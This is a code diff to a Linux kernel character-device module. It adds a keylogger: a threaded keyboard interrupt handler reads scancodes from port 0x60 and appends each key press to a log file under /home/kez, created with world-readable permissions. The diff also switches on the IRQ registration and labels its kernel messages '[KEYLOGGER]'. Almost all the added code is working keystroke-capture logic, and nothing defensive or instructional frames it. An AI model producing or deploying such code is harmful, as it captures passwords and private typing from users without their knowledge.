@@ -7,6 +7,14 @@
 #include <linux/fcntl.h>
 #include <asm/uaccess.h>
 
+// kbd irq
+#include <linux/interrupt.h>
+#include <asm/io.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+#include <linux/buffer_head.h>
+
+
 bool str_eq(const char* str1, const char* str2, size_t len);
 
 void delete_content(void);
@@ -140,6 +148,31 @@ static struct file_operations fops = {
         .open = device_open,
         .release = device_release };
 
+static irqreturn_t irq_handler(int irq, void * data)
+{
+	char * sc = (char *)data;
+	sc[0] = inb(0x60);
+
+	return IRQ_WAKE_THREAD;
+}
+
+static irqreturn_t irq_thread(int irq, void * data)
+{
+	char * sc = (char *)data;
+	char buffer[7];
+
+	if (!(sc[0] & 0x80)) {
+		struct file* outputfile = file_open("/home/kez/log", O_RDWR | O_APPEND | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
+		snprintf(buffer, 6, "%#04x ", (unsigned int)(*sc));
+		file_write(outputfile, 0, buffer, 5);
+		file_close(outputfile);
+	}
+
+	printk(KERN_ALERT "[KEYLOGGER] Scan Code1 %#x %s\n", sc[0] & 0x7f, sc[0] & 0x80 ? "Released" : "Pressed");
+
+	return IRQ_HANDLED;
+}
+
 int init_module(void) {
 	Major = register_chrdev(0, DEVICE_NAME, &fops);
 	if (Major < 0)
@@ -155,17 +188,23 @@ int init_module(void) {
 	printk(KERN_INFO "use 'rm /dev/%s'.\n\n", DEVICE_NAME);
 	// return SUCCESS;
 
-	// return request_threaded_irq(1, irq_handler, irq_thread, IRQF_SHARED, "pc105", &scancode);
+	return request_threaded_irq(1, irq_handler, irq_thread, IRQF_SHARED, "pc105", &scancode);
 }
 
 void cleanup_module(void)
 {
+	// Disable keyboard irq handling
+	printk(KERN_ALERT "[KEYLOGGER] Disabling kbd irq handling.\n");
+	free_irq(1, &scancode);
+
+	// Disable character device
+	printk(KERN_ALERT "[KEYLOGGER] Disabling kbd irq handling.\n");
 	unregister_chrdev(Major, DEVICE_NAME);
-	printk(KERN_ALERT "Closing.\n\n");
 }
 
 static int device_open(struct inode *inode, struct file *file)
 {
+	printk(KERN_ALERT "[KEYLOGGER] Openning device.\n");
 	if (is_dev_opened)
 	{
 		return -EBUSY;
@@ -179,6 +218,7 @@ static int device_open(struct inode *inode, struct file *file)
 
 static int device_release(struct inode *inode, struct file *file)
 {
+	printk(KERN_ALERT "[KEYLOGGER] Releasing device.\n");
 //	--Device_Open;
 	is_dev_opened = false;
 	module_put(THIS_MODULE);
@@ -187,15 +227,19 @@ static int device_release(struct inode *inode, struct file *file)
 
 static ssize_t device_read(struct file *filp,char __user * buff, size_t len, loff_t * offset)
 {
+	int bytes = 0;
+	// char c; // unused variable
+	int size = 0;
+	
+	printk(KERN_ALERT "[KEYLOGGER] Reading device.\n");
+	// TODO: Rewrite this function
 	if (*buff_Ptr == 0 || deleted || output_once)
 	{
 		output_once = false;
 		return 0;
 	}
 	printk(KERN_INFO "Get\n");
-	int bytes = 0;
-	char c;
-	int size = 0;
+
 	if(!is_fwd_dir) // if bakward
 	{
 		while (*buff_Ptr != '\0') // well, it is size
@@ -233,7 +277,7 @@ static ssize_t device_write(struct file *filp, const char __user * buff, size_t 
 	int i;
 	char new_msg[BUF_LEN];
 
-	printk(KERN_INFO "Saving contents: [lenght=%d]", (int)(len - 1) );
+	printk(KERN_INFO "Writing to device: [lenght=%d]", (int)(len - 1) );
 
 	for (i = 0; i < len && i < BUF_LEN; i++)
 	{
